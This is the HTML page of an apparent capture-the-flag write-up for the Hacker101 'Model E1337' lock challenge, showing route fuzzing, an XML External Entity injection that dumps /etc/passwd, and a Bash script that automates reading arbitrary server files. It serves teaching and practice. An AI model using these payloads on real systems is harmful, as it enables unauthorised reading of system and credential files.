@@ -1,0 +1,885 @@
+<!doctype html><html lang=es>
+<head>
+<title>Model E1337 - Rolling Code Lock | 7Rocky</title>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=description content="We have a simple website that requests a code to unlock:
+We can put any number we want, and after a few seconds, we see it is incorrect:
+There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:
+$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  There is an /admin route:">
+<meta name=robots content="index, follow">
+<meta name=image content="https://7rocky.github.io/images/web-cryptography.png">
+<meta name=author content="7Rocky">
+<meta property="og:title" content="Model E1337 - Rolling Code Lock">
+<meta property="og:description" content="We have a simple website that requests a code to unlock:
+We can put any number we want, and after a few seconds, we see it is incorrect:
+There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:
+$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  There is an /admin route:">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/"><meta property="article:section" content="ctf">
+<meta property="og:site_name" content="7Rocky">
+<meta property="og:image" content="https://7rocky.github.io/images/web-cryptography.png">
+<meta property="og:author" content="7Rocky">
+<meta itemprop=name content="Model E1337 - Rolling Code Lock">
+<meta itemprop=description content="We have a simple website that requests a code to unlock:
+We can put any number we want, and after a few seconds, we see it is incorrect:
+There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:
+$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  There is an /admin route:">
+<meta itemprop=wordCount content="11229">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Model E1337 - Rolling Code Lock">
+<meta name=twitter:description content="We have a simple website that requests a code to unlock:
+We can put any number we want, and after a few seconds, we see it is incorrect:
+There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:
+$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  There is an /admin route:">
+<meta name=twitter:image content="https://7rocky.github.io/images/web-cryptography.png">
+<meta name=twitter:author content="7Rocky">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
+<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
+<link href=/css/style.css rel=stylesheet>
+<link href=/css/monokai-sublime.min.css rel=stylesheet>
+<link href=/css/code.css rel=stylesheet>
+<link href=/css/main.css rel=stylesheet>
+<script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
+<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
+<script src=/js/main.js></script>
+<div style=display:none>
+$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$
+</div>
+</head>
+<body class="ma0 production">
+<header>
+<div class=bg-black>
+<nav class="pv3 ph3 ph4-ns" role=navigation>
+<div class="flex-l justify-between items-center center">
+<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
+<div class="flex-l items-center">
+<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/ctf/hacker101ctf/model-e1337-rolling-code-lock/ title=es>
+<img alt=es height=32px src=/images/es.png width=32px>
+</a>
+<ul class="pl0 ml3 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
+</li>
+</ul>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</nav>
+</div>
+</header>
+<main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HACKER101CTF</aside>
+<div id=sharing class=mt3>
+<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/&text=Model%20E1337%20-%20Rolling%20Code%20Lock" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/&title=Model%20E1337%20-%20Rolling%20Code%20Lock" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div>
+<h1 class="f1 mt3 mb1">Model E1337 - Rolling Code Lock</h1>
+<br>
+</header>
+<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
+</aside>
+<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We have a simple website that requests a code to unlock:</p>
+<p><img src=/images/Hacker101CTF/Rolling-Code-1.png alt=Website></p>
+<p>We can put any number we want, and after a few seconds, we see it is incorrect:</p>
+<p><img src=/images/Hacker101CTF/Rolling-Code-2.png alt="Wrong code"></p>
+<p>There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ  
+admin                   [Status: <span class=code-dark-green>200</span>, Size: 287, Words: 25, Lines: 11]
+unlock                  [Status: <span class=code-dark-yellow>405</span>, Size: 178, Words: 20, Lines: 5]
+                        [Status: <span class=code-dark-green>200</span>, Size: 302, Words: 16, Lines: 13]
+</code></pre></div>
+<p>There is an <code>/admin</code> route:</p>
+<p><img src=/images/Hacker101CTF/Rolling-Code-3.png alt="Admin site"></p>
+<p>The source code for this page contains useful information:</p>
+<p><img src=/images/Hacker101CTF/Rolling-Code-4.png alt="Admin site source code"></p>
+<p>If we go to <code>/get-config</code>, we will see an XML document:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/get-config 
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;Front door&lt;/location&gt;&lt;/config&gt;  
+</code></pre></div>
+<p>The output is in XML, so this might be vulnerable to XML External Entity (XXE) injection. If there is a <code>/get-config</code>, it is likely that there is also a <code>/set-config</code> route:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;  
+</code></pre></div>
+<p>We obtain a 400 Bad Request, so probably we need to add some query parameters (for GET) or request body (using POST):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?location=asdf'</span>  
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -d location=asdf
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;405 Method Not Allowed&lt;/title&gt;
+&lt;h1&gt;Method Not Allowed&lt;/h1&gt;
+&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;
+</code></pre></div>
+<p>It does not seem to be a POST request. Since the parameter <code>location</code> does not work, we can try to fuzz the parameter name using <code>ffuf</code> and filtering 400 status code:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?FUZZ=asdf'</span> -mc all -fc 400  
+data                    [Status: <span class=code-dark-red>500</span>, Size: 291, Words: 38, Lines: 5]
+</code></pre></div>
+<p>If the parameter is called <code>data</code> we obtain a 500 Internal Server Error:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?data=asdf'</span>
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;/p&gt;  
+</code></pre></div>
+<p>Let&rsquo;s try putting the XML document of <code>/get-config</code> in the <code>data</code> parameter, but changing the <code>location</code> tag by <code>asdf</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;asdf&lt;/location&gt;&lt;/config&gt;'</span>  
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="admin"&gt;admin&lt;/a&gt;.  If not click the link.
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Model E1337 &amp;mdash; Home&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Admin Panel&lt;/h1&gt;
+    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="asdf" disabled&gt;&lt;/p&gt;
+    &lt;!-- We should be using get-config for this on the client side. --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin -s | <span class=code-dark-green>grep</span> asdf
+    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="<span class=code-red>asdf</span>" disabled&gt;&lt;/p&gt;
+</code></pre></div>
+<p>And the value inside <code>/admin</code> has changed. Now, we can enter another XML document to read files using an XML External Entity like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
+<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]</span><span class=mtk1>&gt;</span>
+<span class=mtk1>&lt;</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>location</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>location</span><span class=mtk1>&gt;</span>
+<span class=mtk1>&lt;/</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;config&gt;&lt;location&gt;&xxe;&lt;/location&gt;&lt;/config&gt;'</span>  
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="admin"&gt;admin&lt;/a&gt;.  If not click the link.
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Model E1337 &mdash; Home&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Admin Panel&lt;/h1&gt;
+    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+" disabled&gt;&lt;/p&gt;
+    &lt;!-- We should be using get-config for this on the client side. --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+<p>And we obtain the file <code>/etc/passwd</code> from the server. At this point, we can create a simple Bash script to pass the absolute path of a file and print its contents if it exists, just to automate the process:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>
+
+<span class=mtk1>url=$1</span>
+<span class=mtk1>file=$2</span>
+
+<span class=mtk1>xml=</span><span class=mtk4>"&lt;?xml version=</span><span class=mtk6>\"</span><span class=mtk4>1.0</span><span class=mtk6>\"</span><span class=mtk4>?&gt;</span>
+<span class=mtk4>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM</span> <span class=mtk6>\"</span><span class="mtk4 detected-link">file://</span><span class="mtk1 detected-link">$file</span><span class=mtk6>\</span><span class=mtk6>"</span><span class=mtk4>&gt; ]&gt;</span>
+<span class=mtk4>&lt;config&gt;</span>
+  <span class=mtk4>&lt;location&gt;</span>
+    <span class=mtk4>BEGINTAG</span>
+<span class=mtk4>&amp;xxe; ENDTAG</span>
+  <span class=mtk4>&lt;/location&gt;</span>
+<span class=mtk4>&lt;/config&gt;"</span>
+
+<span class=mtk1>curl</span> <span class=mtk1>$url/set-config</span> <span class=mtk1>-G</span> <span class=mtk1>--data-urlencode</span> <span class=mtk4>"data=</span><span class=mtk1>$xml</span><span class=mtk4>"</span> <span class=mtk5>&amp;&gt;</span><span class=mtk1>/dev/null</span>
+
+<span class=mtk1>res=</span><span class=mtk4>$(curl</span> <span class=mtk1>$url</span><span class=mtk4>/admin -s)</span>
+
+<span class=mtk1>begin=</span><span class=mtk4>$(( $(echo "</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk4>grep</span> <span class=mtk5>-</span><span class=mtk4>n BEGINTAG</span> <span class=mtk5>|</span> <span class=mtk4>awk</span> <span class=mtk5>-</span><span class=mtk4>F</span> <span class=mtk5>:</span> <span class=mtk4>'{</span> <span class=mtk4>print</span> <span class=mtk1>$1</span> <span class=mtk4>}')</span> <span class=mtk5>+</span> <span class=mtk6>1</span> <span class=mtk4>))</span>  
+<span class=mtk1>end=</span><span class=mtk4>$((</span> <span class=mtk4>$(echo</span> <span class=mtk4>"</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk4>grep</span> <span class=mtk5>-</span><span class=mtk4>n ENDTAG</span> <span class=mtk5>|</span> <span class=mtk4>awk</span> <span class=mtk5>-</span><span class=mtk4>F</span> <span class=mtk5>:</span> <span class=mtk4>'{ print</span> <span class=mtk1>$1</span> <span class=mtk4>}')</span> <span class=mtk5>-</span> <span class=mtk6>1</span> <span class=mtk4>))</span>
+
+<span class=mtk7>echo</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk1>sed</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>${begin}</span><span class=mtk4>,</span><span class=mtk1>${end}</span><span class=mtk4>p"</span>
+</code></pre></div>
+<p>Now with this Bash script we can read files from the server specifying the absolute path:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts 
+127.0.0.1  localhost
+::1  localhost ip6-localhost ip6-loopback
+fe00::0  ip6-localnet
+ff00::0  ip6-mcastprefix
+ff02::1  ip6-allnodes
+ff02::2  ip6-allrouters
+172.18.0.20  c33a5d03b6b4
+</code></pre></div>
+<p>Although we know the server has nginx configured, we cannot show configuration files such as <code>/etc/nginx/nginx.conf</code> or <code>/etc/nginx/sites-enabled/default</code>.</p>
+<p>However, we can guess that the server is running Flask (a Python web framework) because the HTTP response status messages are in capital letters:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/doesnotexist -I
+HTTP/1.1 404 NOT FOUND
+<span class=code-white>Server</span>: nginx/1.14.0 (Ubuntu)
+<span class=code-white>Date</span>: 
+<span class=code-white>Content-Type</span>: text/html
+<span class=code-white>Content-Length</span>: 233
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>Cache-Control</span>: public, max-age=0
